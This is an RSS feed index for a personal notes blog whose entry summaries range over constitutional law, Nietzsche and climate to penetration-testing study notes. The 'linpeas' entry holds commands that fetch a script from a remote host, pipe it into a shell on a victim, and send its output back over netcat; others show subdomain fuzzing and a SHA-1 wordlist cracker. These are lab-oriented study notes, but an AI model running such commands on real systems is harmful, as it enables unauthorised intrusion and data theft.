@@ -1,0 +1,347 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Index on Braindump</title>
+    <link>https://kdbed.github.io/</link>
+    <description>Recent content in Index on Braindump</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 29 May 2022 21:44:03 +0800</lastBuildDate><atom:link href="https://kdbed.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Abortion</title>
+      <link>https://kdbed.github.io/posts/abortion/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/abortion/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Abortion and the Supreme Court: Roe V Wade, Dobbs V Jackson, etc</title>
+      <link>https://kdbed.github.io/posts/roevwade/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/roevwade/</guid>
+      <description>Abortion and the Supreme Court Roe V Wade Basic Conclusions - Roe Drawing on the First, Fourth, Ninth, and Fourteenth Amendments, the Court said that the Constitution protects an individual’s “zones of privacy.” Citing earlier cases that ruled that contraception, marriage, and child rearing were activities included in these “zones of privacy,” the Court found that the zone was “broad enough to encompass a woman’s decision whether or not to terminate her pregnancy.</description>
+    </item>
+    
+    <item>
+      <title>Active Scanning with Scapy</title>
+      <link>https://kdbed.github.io/posts/scapy_scanning/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/scapy_scanning/</guid>
+      <description>Scanning Networks with Scapy Nmap implements several types of scans and can be used to detect the versions of operating systems and services; it can also perform custom vulnerability scanning. Here we&amp;rsquo;ll implement a couple of simple scans using scapy in Python.
+SYN scan : A SYN scan sends a TCP SYN packet to a port and looks for a SYN/ACK packet in response. DNS scan : A DNS scan tests whether a DNS server is running on the target system.</description>
+    </item>
+    
+    <item>
+      <title>algorithms</title>
+      <link>https://kdbed.github.io/posts/algorithms/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/algorithms/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>AS-REP Roasting</title>
+      <link>https://kdbed.github.io/posts/as_rep_roasting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/as_rep_roasting/</guid>
+      <description>AS-REP Roasting Two key attacks on Kerberos security in Active Directory include kerberoasting and AS-REP Roasting. Kerberoasting typically requires credentials on the domain to authenticate with. There is an option for an account to have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true. AS-REP Roasting is an attack against Kerberos for these accounts.
+Use the Impacket tool GetNPUsers.py to try to get a hash for each user</description>
+    </item>
+    
+    <item>
+      <title>Birthday Attack</title>
+      <link>https://kdbed.github.io/posts/birthdayattack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/birthdayattack/</guid>
+      <description>Birthday Attack The birthday attack is named after the birthday paradox. The name is based on fact that in a room with 23 people or more, the odds are greater than 50% that two will share the same birthday. Many find this counterintuitive, and the birthday paradox illustrates why many people’s instinct on probability (and risk) is wrong. You are not trying to match a specific birthday (such as yours); you are trying to match any birthday.</description>
+    </item>
+    
+    <item>
+      <title>Category Theory</title>
+      <link>https://kdbed.github.io/posts/category_theory/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/category_theory/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>ComptTIA Security&#43;</title>
+      <link>https://kdbed.github.io/posts/securityplus/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/securityplus/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>DNS Zone Transfers</title>
+      <link>https://kdbed.github.io/posts/dnszonetransfers/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/dnszonetransfers/</guid>
+      <description>DNS Zone Transfers DNS zone transfers using the AXFR protocol are the simplest mechanism to replicate DNS records across DNS servers. To avoid the need to edit information on multiple DNS servers, you can edit information on one server and use AXFR to copy information to other servers. However, if you do not protect your servers, malicious parties may use AXFR to get information about all your hosts.
+How DNS Works DNS (Domain Name System) is like an Internet phonebook.</description>
+    </item>
+    
+    <item>
+      <title>dopamine</title>
+      <link>https://kdbed.github.io/posts/dopamine/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/dopamine/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Generative Effects: Orders and Galois Connections</title>
+      <link>https://kdbed.github.io/posts/generativeeffects/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/generativeeffects/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Greenhouse Gas Emissions</title>
+      <link>https://kdbed.github.io/posts/greenhouseemissions/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/greenhouseemissions/</guid>
+      <description>Raw Numbers Fifty-one billion is how many tons of greenhouse gases the world typically adds to the atmosphere every year. &amp;ndash;Bill Gates, How to Avoid a Climate Disaster (2021)</description>
+    </item>
+    
+    <item>
+      <title>happiness</title>
+      <link>https://kdbed.github.io/posts/happiness/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/happiness/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>haskellTest</title>
+      <link>https://kdbed.github.io/posts/haskelltest/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/haskelltest/</guid>
+      <description>import Control.Monad :{ map (\x -&amp;gt; x*x + x + 1) [1..10] :} [3,7,13,21,31,43,57,73,91,111] </description>
+    </item>
+    
+    <item>
+      <title>IdentityIQEssentialsIntroduction</title>
+      <link>https://kdbed.github.io/posts/identityiqessentialsintroduction/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/identityiqessentialsintroduction/</guid>
+      <description>Introduction Reading data: all systems from which data is read are called applications. Identity cubes created when aggregating accounts from an authoritative application (system of record), e.g., HR system or AD. Business modeling Governance Process Provisioning Process : User Request; Lifecycle event </description>
+    </item>
+    
+    <item>
+      <title>Impacket</title>
+      <link>https://kdbed.github.io/posts/impacket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/impacket/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Internet Security Association and Key Management Protocol (ISAKMP)</title>
+      <link>https://kdbed.github.io/posts/isakmp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/isakmp/</guid>
+      <description>Internet Security Association and Key Management Protocol (ISAKMP) Wiki Overview ISAKMP defines the procedures for authenticating a communicating peer, creation and management of Security Associations, key generation techniques and threat mitigation (e.g. denial of service and replay attacks). As a framework,[1] ISAKMP typically utilizes IKE for key exchange, although other methods have been implemented such as Kerberized Internet Negotiation of Keys. A Preliminary SA is formed using this protocol; later a fresh keying is done.</description>
+    </item>
+    
+    <item>
+      <title>Intro to Pwntools - TryHackMe</title>
+      <link>https://kdbed.github.io/posts/introtopwntools/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/introtopwntools/</guid>
+      <description>Intro to Pwntools Source materials here dizmascyberlabs Install gdb-pwndbg-peda-gef
+Checksec Same source code, compiled with different protections in place:
+checksec checksec/intro2pwn2 [*] &amp;#39;/home/kdb/Downloads/IntroToPwntools/IntroToPwntools/checksec/intro2pwn2&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 1 checksec checksec/intro2pwn1 [*] &amp;#39;/home/kdb/Downloads/IntroToPwntools/IntroToPwntools/checksec/intro2pwn1&amp;#39; Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled </description>
+    </item>
+    
+    <item>
+      <title>Kerberoasting</title>
+      <link>https://kdbed.github.io/posts/kerberoasting/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/kerberoasting/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Kerberos</title>
+      <link>https://kdbed.github.io/posts/kerberos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/kerberos/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>linpeas</title>
+      <link>https://kdbed.github.io/posts/linpeas/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/linpeas/</guid>
+      <description>Execution: Run from memory and send back to attacker:
+# Local network sudo python -m SimpleHTTPServer 80 #Host curl 10.10.10.10/linpeas.sh | sh #Victim # Without curl sudo nc -q 5 -lvnp 80 &amp;lt; linpeas.sh #Host cat &amp;lt; /dev/tcp/10.10.10.10/80 | sh #Victim # Excute from memory and send output back to the host nc -lvnp 9002 | tee linpeas.out #Host curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim </description>
+    </item>
+    
+    <item>
+      <title>Marx</title>
+      <link>https://kdbed.github.io/posts/marx/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/marx/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Nietzsche</title>
+      <link>https://kdbed.github.io/posts/nietzsche/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/nietzsche/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Nietzsche and Stoicism</title>
+      <link>https://kdbed.github.io/posts/nietzsche_and_stoicism/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/nietzsche_and_stoicism/</guid>
+      <description>Nietzsche and Stoicism Resolution of contradictions After describing the Stoics’ essential psychological characteristics, Nietzsche advances two obscure but critical remarks. First, he questions whether the Stoics’ attainment of their ethical ideal is significant on the grounds that the decision to adopt Stoic therapy is determined in advance by one’s character. Second, he rebukes the Stoics for underestimating the worth of pain and passion, and for the fatalistic acceptance of life that their therapy produces.</description>
+    </item>
+    
+    <item>
+      <title>Org Mode - Python/Jupyter Example</title>
+      <link>https://kdbed.github.io/posts/orgpythonjupyter/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/orgpythonjupyter/</guid>
+      <description>Create a Session Initialize server with org-babel-exp-src-block. Afterwards, &amp;lsquo;Enter&amp;rsquo; in the sourceblock will execute.
+print(&amp;#39;ello, world!&amp;#39;) Create a plot import matplotlib.pyplot as plt fig, ax = plt.subplots() ax.plot([1, 2, 3, 4], [1, 4, 2, 3]) pass Ocaml print_string &amp;#34;Hello world!\n&amp;#34; </description>
+    </item>
+    
+    <item>
+      <title>Originalism</title>
+      <link>https://kdbed.github.io/posts/originalism/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/originalism/</guid>
+      <description>Originalism, the theory that the Constitution should be interpreted according to the meaning or intent of the drafters, has great appeal to Americans. At one time closely associated with the conservative movement, originalism is now commonly held as an important, if not the exclusive, device for interpreting the Constitution. This has not been our historic practice. Over thirty years ago, Munzer and Nickel (1977, 1029) wrote that “one does not have to dig very deeply into the literature of American constitutional law to suspect that many constitutional provisions do not mean today what their framers thought they meant.</description>
+    </item>
+    
+    <item>
+      <title>Quotes</title>
+      <link>https://kdbed.github.io/posts/quotes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/quotes/</guid>
+      <description>Quotes Quote 1 - Marx You would be wrong if you thought that I love books. I am a machine condemned to devour them in order to vomit them up in a new form, like manure on the soil of history.
+— Marx in a letter to his daughter Laura, 1868
+Quote 2 &amp;ldquo;Meet these two here,&amp;rdquo; the man said. &amp;ldquo;Ask them if they&amp;rsquo;ve got a Mississippi credit card.&amp;rdquo;
+&amp;ldquo;Oh, I know that one,&amp;rdquo; Ruthie explaimed cheerfully.</description>
+    </item>
+    
+    <item>
+      <title>S_MIME</title>
+      <link>https://kdbed.github.io/posts/s_mime/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/s_mime/</guid>
+      <description>S/MIME ComptTIA Security+ </description>
+    </item>
+    
+    <item>
+      <title>sha1</title>
+      <link>https://kdbed.github.io/posts/sha1/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/sha1/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>sha1Cracker</title>
+      <link>https://kdbed.github.io/posts/sha1cracker/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/sha1cracker/</guid>
+      <description>Implementing a sha1 hash cracker in Rust use sha1::Digest; use std::{ env, error::Error, fs::File, io::{BufRead, BufReader}, }; const SHA1_HEX_STRING_LENGTH: usize = 40; fn main() -&amp;gt; Result&amp;lt;(), Box&amp;lt;dyn Error&amp;gt;&amp;gt; { let args: Vec&amp;lt;String&amp;gt; = env::args().collect(); if args.len() != 3 { println!(&amp;#34;Usage:&amp;#34;); println!(&amp;#34;sha1_cracker: &amp;lt;wordlist.txt&amp;gt; &amp;lt;sha1_hash&amp;gt;&amp;#34;); return Ok(()); } let hash_to_crack = args[2].trim(); if hash_to_crack.len() != SHA1_HEX_STRING_LENGTH { return Err(&amp;#34;sha1 hash is not valid.&amp;#34;.into()); } let wordlist_file = File::open(&amp;amp;args[1])?; let reader = BufReader::new(&amp;amp;wordlist_file); for line in reader.</description>
+    </item>
+    
+    <item>
+      <title>SMTPS</title>
+      <link>https://kdbed.github.io/posts/smtps/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/smtps/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Subdomain Enumeration</title>
+      <link>https://kdbed.github.io/posts/subdomainenumeration/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/subdomainenumeration/</guid>
+      <description>From DNS dig +nocmd trick.htb axfr +noall +answer @trick.htb WFuzz In case the subdomain has a certain naming convention (Trick/HTB):
+sed &amp;#39;s/^/preprod-/&amp;#39; subdomains-top1million-110000.txt Then use wfuzz:
+sudo wfuzz -c -f out -w wordlist -u &amp;#34;http://trick.htb&amp;#34; -H &amp;#34;Host: FUZZ.trick.htb&amp;#34; --hw 475 </description>
+    </item>
+    
+    <item>
+      <title>TODO</title>
+      <link>https://kdbed.github.io/posts/todo/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/todo/</guid>
+      <description>TODO Complete Summer Yard Work TODO Burn outstanding refuse TODO Chainsaw fallen biggies TODO Clear pricks TODO Windows and Doors TODO Schedule Professional Assessment TODO Fix Garage Door TODO Send baby ABCs to Austin TODO Basement TODO Mattress TODO Trash TODO seal bathtub TODO nicotine test TODO quit TODO bloodwork </description>
+    </item>
+    
+    <item>
+      <title>wfuzz</title>
+      <link>https://kdbed.github.io/posts/wfuzz/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/wfuzz/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>words</title>
+      <link>https://kdbed.github.io/posts/20220824081229-words/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/20220824081229-words/</guid>
+      <description>susurrus</description>
+    </item>
+    
+    <item>
+      <title>Z3 Basics</title>
+      <link>https://kdbed.github.io/posts/z3_basics/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://kdbed.github.io/posts/z3_basics/</guid>
+      <description></description>
+    </item>
+    
+  </channel>
+</rss>
